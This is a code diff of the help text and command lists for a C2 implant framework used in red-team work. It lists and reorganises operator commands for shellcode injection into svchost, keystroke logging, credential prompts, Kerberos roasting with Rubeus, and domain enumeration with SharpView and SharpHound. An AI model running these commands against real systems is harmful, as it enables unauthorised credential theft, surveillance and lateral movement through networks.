@@ -47,24 +47,15 @@ get-content c:\\temp\\log.txt
 pwd
 delete c:\\temp\\test.exe
 move c:\\temp\\old.exe c:\\temp\\new.exe
-cred-popper
 resolveip 127.0.0.1
 resolvednsname google.com
-testadcredential domain username password
-testlocalcredential username password
-get-screenshot
 loadmodule Seatbelt.exe
 loadmoduleforce
 listmodule
 modulesloaded
-arpscan 172.16.0.1/24 true
-get-serviceperms c:\\temp\\
 run-exe Core.Program Core
-run-exe Rubeus.Program Rubeus asktgt /user:test /rc4:fdfdsfdsfds
 run-dll Seatbelt.Program Seatbelt UserChecks
 start-process net -argumentlist users
-inject-shellcode c:\\windows\\system32\\svchost.exe <optional-ppid-spoofid>
-inject-shellcode 1453 <optional-ppid-spoofid>
 download-file "c:\\temp\\test.exe"
 upload-file -source /tmp/test.exe -destination "c:\\temp\\test.exe"
 kill-implant
@@ -74,6 +65,54 @@ help
 searchhelp listmodules
 label-implant <newlabel>
 back
+
+Migration
+===========
+inject-shellcode c:\\windows\\system32\\svchost.exe <optional-ppid-spoofid>
+inject-shellcode 1453 <optional-ppid-spoofid>
+
+Privilege Escalation:
+=======================
+arpscan 172.16.0.1/24 true
+get-serviceperms c:\\temp\\
+get-screenshot
+get-keystrokes c:\\temp\\logger.txt
+stop-keystrokes
+testadcredential domain username password
+testlocalcredential username password
+cred-popper
+
+Privilege Escalation:
+=======================
+loadmodule SharpView.exe
+run-exe Seatbelt.Program Seatbelt all
+run-exe Seatbelt.Program Seatbelt BasicOSInfo
+run-exe Seatbelt.Program Seatbelt SysmonConfig
+run-exe Seatbelt.Program Seatbelt PowerShellSettings
+run-exe Seatbelt.Program Seatbelt RegistryAutoRuns
+
+Network Tasks / Lateral Movement:
+====================================
+loadmodule SharpView.exe
+run-exe Rubeus.Program Rubeus kerberoast
+run-exe Rubeus.Program Rubeus asreproast /user:username
+
+Network Tasks / Lateral Movement:
+====================================
+run-exe SharpView.Program SharpView Get-NetUser -SamAccountName ben
+run-exe SharpView.Program SharpView Get-NetUser -Name deb -Domain blorebank.local
+run-exe SharpView.Program SharpView Get-NetSession -Domain blorebank.local
+run-exe SharpView.Program SharpView Get-DomainController -Domain blorebank.local
+run-exe SharpView.Program SharpView Get-DomainUser -LDAPFilter samaccountname=ben -Properties samaccountname,mail
+run-exe SharpView.Program SharpView Get-DomainUser -AdminCount -Properties samaccountname
+run-exe SharpView.Program SharpView Get-DomainComputer -LDAPFilter operatingsystem=*2012* -Properties samaccountname
+run-exe SharpView.Program Sharpview Find-InterestingFile -Path c:\users\ -Include *exe*
+run-exe SharpView.Program SharpView Find-InterestingDomainShareFile -ComputerName SERVER01
+
+Bloodhound:
+=============
+loadmodule SharpHound.exe
+run-exe Sharphound2.Sharphound Sharphound --ZipFileName c:\temp\test.zip --JsonFolder c:\temp\
 """
 
 posh_help1 = """
@@ -410,4 +449,4 @@ COMMANDS += ['invoke-psexecdaisypayload','invoke-wmidaisypayload', 'invoke-dcomd
 
 UXCOMMANDS = ["label-implant", "unhide-implant","hide-implant","help","searchhelp","python","loadmodule","loadmoduleforce","get-keystrokes","back","upload-file","download-file","install-persistence","remove-persistence","sai","startanotherimplant-keepfile","get-screenshot","startanotherimplant","pwd","id","ps","setbeacon","kill-implant"]
 
-SHARPCOMMANDS = ["delete","move","label-implant", "upload-file","download-file","get-content","ls-recurse","turtle","cred-popper","resolveip","resolvednsname","testadcredential","testlocalcredential","get-screenshot","modulesloaded","get-serviceperms","unhide-implant","arpscan","ls","pwd","dir","inject-shellcode","start-process","run-exe","run-dll","hide-implant","help","searchhelp","listmodules","loadmodule","loadmoduleforce","back","ps","beacon","setbeacon","kill-implant"]
+SHARPCOMMANDS = ["stop-keystrokes","get-keystrokes","delete","move","label-implant","upload-file","download-file","get-content","ls-recurse","turtle","cred-popper","resolveip","resolvednsname","testadcredential","testlocalcredential","get-screenshot","modulesloaded","get-serviceperms","unhide-implant","arpscan","ls","pwd","dir","inject-shellcode","start-process","run-exe","run-dll","hide-implant","help","searchhelp","listmodules","loadmodule","loadmoduleforce","back","ps","beacon","setbeacon","kill-implant"]
